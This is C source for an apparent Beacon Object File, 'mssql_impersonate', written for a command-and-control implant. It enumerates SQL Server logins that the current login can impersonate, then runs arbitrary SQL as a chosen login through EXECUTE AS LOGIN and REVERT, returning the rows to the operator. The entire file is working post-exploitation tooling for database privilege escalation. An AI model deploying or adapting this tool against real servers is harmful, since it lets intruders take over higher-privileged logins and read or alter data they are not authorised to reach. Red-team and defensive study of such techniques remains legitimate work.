/*
 * mssql_impersonate — EXECUTE AS LOGIN wrapper for in-SQL privesc.
 *
 * Discovers impersonatable logins (or you can pass --discover) and runs a
 * query as the chosen login. Combined with mssql_query semantics: returns
 * rows like a SELECT.
 *
 * Usage:
 *   mssql_impersonate <host> --discover
 *       lists logins on which the current login has IMPERSONATE permission
 *   mssql_impersonate <host> <login> "<sql>"
 *       runs SQL as <login> via EXECUTE AS LOGIN; ...; REVERT;
 */

#include <winsock2.h>
#include <windows.h>
#include "../bof_compat/beacon.h"
#include "../common/dynimports.h"
#include "../common/args.h"
#include "../tds/tds.h"

static void ascii_to_wide(const char *in, wchar_t *out, size_t outlen) {
    size_t i = 0;
    for (; i < outlen - 1 && in && in[i]; ++i) out[i] = (wchar_t)(unsigned char)in[i];
    out[i] = 0;
}

void go(char *args, int alen) {
    bof_args_t a;
    bof_args_init(&a, args, alen);
    const char *host = bof_args_str_pos(&a, 0);
    int discover = bof_args_bool_flag(&a, "--discover");
    int port = bof_args_int_flag(&a, "--port", 1433);

    if (!host) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] usage: mssql_impersonate <host> --discover");
        BeaconPrintf(CALLBACK_ERROR,
                     "[!]    or: mssql_impersonate <host> <login> \"<sql>\"");
        return;
    }
    wchar_t whost[256];
    ascii_to_wide(host, whost, 256);

    tds_conn_t *c = NULL;
    int rc = tds_connect(whost, (uint16_t)port, NULL, NULL, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect: %ls", tds_last_error(c));
        if (c) tds_close(c);
        return;
    }

    if (discover) {
        static const wchar_t *sql =
            L"SELECT DISTINCT b.name AS impersonatable_login "
            L"FROM sys.server_permissions a "
            L"JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
            L"WHERE a.permission_name = 'IMPERSONATE'";
        tds_result_t *r = NULL;
        rc = tds_query(c, sql, &r);
        if (rc != TDS_OK || !r) {
            BeaconPrintf(CALLBACK_ERROR, "[!] discover: %ls", tds_last_error(c));
            tds_close(c);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Impersonatable logins:");
        wchar_t name[128];
        int n = 0;
        while (tds_result_next_row(r) == 1) {
            tds_result_get_str(r, 0, name, 128);
            BeaconPrintf(CALLBACK_OUTPUT, "  - %ls", name);
            ++n;
        }
        if (n == 0) BeaconPrintf(CALLBACK_OUTPUT, "  (none — current login has no IMPERSONATE rights)");
        tds_close(c);
        return;
    }

    const char *login = bof_args_str_pos(&a, 1);
    const char *user_sql = bof_args_str_pos(&a, 2);
    if (!login || !user_sql) {
        BeaconPrintf(CALLBACK_ERROR, "[!] missing login or sql");
        tds_close(c);
        return;
    }

    /* Build EXECUTE AS LOGIN = '<login>'; <sql>; REVERT; on heap */
    wchar_t *sql = (wchar_t*)MSVCRT$malloc(8192 * sizeof(wchar_t));
    if (!sql) { tds_close(c); return; }
    size_t pos = 0;
    const wchar_t *p = L"EXECUTE AS LOGIN = '";
    while (*p && pos < 8180) sql[pos++] = *p++;
    for (size_t i = 0; login[i] && pos < 8180; ++i) {
        if (login[i] == '\'') sql[pos++] = L'\'';
        sql[pos++] = (wchar_t)(unsigned char)login[i];
    }
    sql[pos++] = L'\''; sql[pos++] = L';'; sql[pos++] = L' ';
    for (size_t i = 0; user_sql[i] && pos < 8180; ++i)
        sql[pos++] = (wchar_t)(unsigned char)user_sql[i];
    const wchar_t *r2 = L"; REVERT;";
    for (int i = 0; r2[i] && pos < 8190; ++i) sql[pos++] = r2[i];
    sql[pos] = 0;

    tds_result_t *r = NULL;
    rc = tds_query(c, sql, &r);
    MSVCRT$free(sql);
    if (rc != TDS_OK || !r) {
        BeaconPrintf(CALLBACK_ERROR, "[!] impersonate query failed");
        if (r) tds_result_free(r);
        tds_close(c);
        return;
    }

    int n_cols = tds_result_get_col_count(r);
    int rows = 0;
    wchar_t *line = (wchar_t*)MSVCRT$malloc(4096 * sizeof(wchar_t));
    if (line) {
        while (tds_result_next_row(r) == 1) {
            size_t lp = 0;
            line[0] = 0;
            for (int i = 0; i < n_cols && lp < 4000; ++i) {
                wchar_t cell[256];
                tds_result_get_str(r, i, cell, 256);
                for (int j = 0; cell[j] && lp < 4000; ++j) line[lp++] = cell[j];
                if (i + 1 < n_cols && lp < 4000) line[lp++] = L'\t';
            }
            line[lp] = 0;
            BeaconPrintf(CALLBACK_OUTPUT, "%ls", line);
            ++rows;
        }
        MSVCRT$free(line);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "(%d row%s)", rows, rows == 1 ? "" : "s");
    tds_result_free(r);
    tds_close(c);
}
